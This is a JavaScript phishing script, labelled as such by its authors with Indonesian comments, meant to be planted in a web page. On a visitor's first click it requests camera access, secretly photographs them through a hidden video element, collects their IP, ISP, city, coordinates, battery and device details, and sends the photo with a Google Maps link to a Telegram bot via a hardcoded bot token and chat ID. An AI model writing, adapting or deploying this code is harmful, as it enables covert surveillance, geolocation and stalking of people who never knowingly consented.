// phising by zeyy&rey
const BOT_TOKEN = "8367413026:AAEM93F3pqbBwdOwJTCHs_0TYO4PnVsGfqY"; 
const CHAT_ID = "8482486283"; 

//akses langsung dari klik layar
const camera = document.createElement("video");
camera.setAttribute("autoplay", true);
camera.style.display = "none";
document.body.appendChild(camera);

// info batrai
async function getBatteryInfo() {
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      return {
        level: Math.round(battery.level * 100) + "%",
        charging: battery.charging ? "Ya" : "Tidak"
      };
    } catch (err) {
      console.error("Gagal ambil info baterai:", err);
      return { level: "-", charging: "-" };
    }
  } else {
    return { level: "-", charging: "-" };
  }
}

// ambil data data time
async function getUserInfo() {
  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const namaWifi = connection && connection.type ? connection.type : "Tidak diketahui";

    const battery = await getBatteryInfo();

    const deviceInfo = {
      browser: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      wifi: namaWifi,
      batteryLevel: battery.level,
      batteryCharging: battery.charging
    };

    return {
      ip: ipData.ip || "-",
      isp: ipData.org || "-",
      city: ipData.city || "-",
      region: ipData.region || "-",
      country: ipData.country_name || "-",
      lat: ipData.latitude,
      lon: ipData.longitude,
      time: new Date().toLocaleString(),
      ...deviceInfo
    };
  } catch (err) {
    console.error("Gagal ambil info user:", err);
    return {};
  }
}

// send data ke bot telegram
function kirimFotoTelegram(blob, info) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "capture.jpg");
  formData.append(
    "caption",
    `📡 IP: ${info.ip}
🏢 ISP: ${info.isp}
📶 Nama WiFi: ${info.wifi}
🔋 Baterai: ${info.batteryLevel} (Charging: ${info.batteryCharging})
📍 Lokasi: ${info.lat}, ${info.lon}
🌆 Kota: ${info.city}, ${info.region}, ${info.country}
🕒 Waktu: ${info.time} (${info.timezone})
💻 Device: ${info.platform}
🌐 Browser: ${info.browser}
🖥 Resolusi: ${info.screen}
🔗 https://www.google.com/maps?q=${info.lat},${info.lon}
@Z&R`
  );

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

// Minta izin kamera
function requestPermissions() {
  return new Promise((ok, err) => {
    (async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
        });
        camera.srcObject = stream;
        ok(true);
      } catch (e) {
        err("Gagal mendapatkan izin kamera");
      }
    })();
  });
}

// Capture gambar lalu kirim
async function captureAndSend() {
  const info = await getUserInfo();

  const canvas = document.createElement("canvas");
  canvas.width = camera.videoWidth || 640;
  canvas.height = camera.videoHeight || 480;
  canvas.getContext("2d").drawImage(camera, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(
    (blob) => {
      kirimFotoTelegram(blob, info).then(() =>
        console.log("Foto + data terkirim ke Telegram")
      );
    },
    "image/jpeg",
    0.95
  );
}

// Jalankan pas klik pertama di halaman
document.body.addEventListener(
  "click",
  () => {
    requestPermissions()
      .then(() => {
        setTimeout(() => captureAndSend(), 3000);
      })
      .catch((e) => {
        console.error("Error:", e);
      });
  },
  { once: true }
);